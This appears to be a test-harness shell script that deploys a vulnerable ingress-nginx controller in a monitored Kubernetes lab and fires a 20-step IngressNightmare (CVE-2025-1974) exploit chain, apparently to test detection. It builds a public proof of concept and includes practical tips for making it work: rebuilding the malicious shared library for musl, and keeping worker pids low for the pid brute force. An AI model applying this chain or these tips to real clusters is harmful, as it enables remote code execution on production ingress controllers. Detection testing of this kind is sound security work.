#!/usr/bin/env bash
# run-ingress-e2e.sh — IngressNightmare (CVE-2025-1974) chain, start to finish, driven by Ran.
#
# Deploys the shared iktlinz worker platform + a vulnerable ingress-nginx v1.11.0
# adopted under a signed SBoB + the echo backend it routes/exfils through, then
# fires the 20-step chain via Ran so it renders in the Ran UI. Same shape as
# example/iktlinz/run-iktlinz-e2e.sh; chain 3 reuses that platform's worker.
#
#   ./run-ingress-e2e.sh                 # deploy + fire 1-20
#   ./run-ingress-e2e.sh --benign-only   # deploy only, no attack
#   ./run-ingress-e2e.sh --no-deploy     # fire against an already-deployed stack
#
# Requires on PATH: kubectl, python3, curl, go (builds the PoC). Ran reachable at
# --ran-url (default http://localhost:8080). sign-object + a vendor key sign the SBoB.
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
ROOT="$(cd "$HERE/../.." && pwd)"

RAN_URL="${RAN_URL:-http://localhost:8080}"
DEPLOY=1; BENIGN_ONLY=0; FROM=1; TO=20
SIGN_OBJECT="${SIGN_OBJECT:-$ROOT/example/redis/distros/signed-bundles/sign-object}"
VENDOR_KEY="${VENDOR_KEY:-$ROOT/example/redis/distros/signed-bundles/keys/vendor.pem}"
NS=ingress-nginx; VER=controller-v1.11.0
while [ $# -gt 0 ]; do case "$1" in
  --ran-url) RAN_URL="$2"; shift 2;;
  --no-deploy) DEPLOY=0; shift;;
  --benign-only) BENIGN_ONLY=1; shift;;
  --from) FROM="$2"; shift 2;;
  --to) TO="$2"; shift 2;;
  -h|--help) sed -n '2,12p' "$0"; exit 0;;
  *) echo "unknown arg: $1"; exit 2;;
esac; done
say(){ printf '[%s] %s\n' "$(date -u +%H:%M:%S)" "$*"; }

kubectl get nodes >/dev/null 2>&1 || { say "FAIL: kubectl cannot reach a cluster"; exit 2; }
curl -sf "$RAN_URL/api/armory" -o /dev/null || { say "FAIL: Ran not reachable at $RAN_URL"; exit 2; }
say "preflight ok — cluster + Ran up at $RAN_URL"

if [ "$DEPLOY" = 1 ]; then
  say "shared iktlinz worker platform (foothold that chain 3 reuses)"
  ( cd "$ROOT/example/iktlinz" && RAN_URL="$RAN_URL" ./run-iktlinz-e2e.sh --benign-only --no-benign --pre 2 --post 2 ) 2>&1 | tail -3

  say "monitor ingress-nginx (drop it from the node-agent exclude list)"
  P=$(kubectl -n honey get cm node-agent -o jsonpath='{.data.config\.json}' | python3 -c 'import json,sys;c=json.load(sys.stdin);c["excludeNamespaces"]=",".join(x for x in c["excludeNamespaces"].split(",") if x!="ingress-nginx");print(json.dumps({"data":{"config.json":json.dumps(c)}}))')
  kubectl -n honey patch cm node-agent --type merge -p "$P" >/dev/null 2>&1
  kubectl -n honey rollout restart ds/node-agent >/dev/null 2>&1

  say "vulnerable ingress-nginx $VER"
  kubectl apply -f "https://raw.githubusercontent.com/kubernetes/ingress-nginx/$VER/deploy/static/provider/cloud/deploy.yaml" >/dev/null 2>&1
  kubectl -n "$NS" rollout status deploy/ingress-nginx-controller --timeout=240s 2>&1 | tail -1
  kubectl -n honey rollout status ds/node-agent --timeout=180s >/dev/null 2>&1

  say "echo backend + echo.local Ingress (the route/exfil target)"
  ( cd "$HERE" && ./drive-benign.sh ) >/dev/null 2>&1

  say "sign + bind cp-ingress-base to the controller"
  python3 -c "import yaml;d=yaml.safe_load(open('$HERE/sbobs/cp-ingress-base.yaml'));d['metadata']['namespace']='$NS';yaml.safe_dump(d,open('/tmp/cp-ingress-base-ns.yaml','w'),default_flow_style=False,sort_keys=False)"
  "$SIGN_OBJECT" sign --file /tmp/cp-ingress-base-ns.yaml --output /tmp/cp-ingress-base-signed.yaml --key "$VENDOR_KEY" --type containerprofile >/dev/null 2>&1
  kubectl apply -f /tmp/cp-ingress-base-signed.yaml >/dev/null 2>&1
  kubectl -n "$NS" patch deploy ingress-nginx-controller --type merge \
    -p '{"spec":{"template":{"metadata":{"labels":{"kubescape.io/user-defined-profile":"ingress-base"}}}}}' >/dev/null 2>&1
  kubectl -n "$NS" rollout status deploy/ingress-nginx-controller --timeout=180s 2>&1 | tail -1
  say "controller adopted signed base: $(kubectl -n honey logs ds/node-agent --since=90s 2>/dev/null | grep -c 'adopted user-authored')"

  say "build the IngressNightmare PoC (ing)"
  if [ ! -x "$HERE/ein/ing" ]; then
    ( cd "$HERE" && git clone -q https://github.com/Esonhugh/ingressNightmare-CVE-2025-1974-exps ein 2>/dev/null )
    say "rebuild danger.so for musl (the controller is Alpine; a glibc .so fails ENGINE_by_id with 'Exec format error' and the RCE silently no-ops)"
    docker run --rm -v "$HERE/ein/nginx-ingress":/work -w /work alpine:3.20 sh -c 'apk add --no-cache gcc musl-dev >/dev/null && gcc -fPIC -shared -o danger.so danger.c'
    ( cd "$HERE/ein" && CGO_ENABLED=0 go build -o ing . ) 2>&1 | tail -2
  fi
fi

if [ "$BENIGN_ONLY" = 1 ]; then say "benign-only: platform + ingress up, no attack fired"; exit 0; fi

say "restart the controller so nginx worker pids are low (the PoC brute-forces pids 5-45; a churned controller's workers climb out of range and the fd-hunt misses)"
kubectl -n "$NS" rollout restart deploy/ingress-nginx-controller >/dev/null 2>&1
kubectl -n "$NS" rollout status deploy/ingress-nginx-controller --timeout=180s 2>&1 | tail -1

docker restart ran-ui >/dev/null 2>&1; sleep 15
say "fire chain 3 (steps $FROM-$TO) via Ran"
( cd "$HERE" && RAN_URL="$RAN_URL" python3 -u demo_chain3.py --from "$FROM" --to "$TO" --keep-going )
say "done"
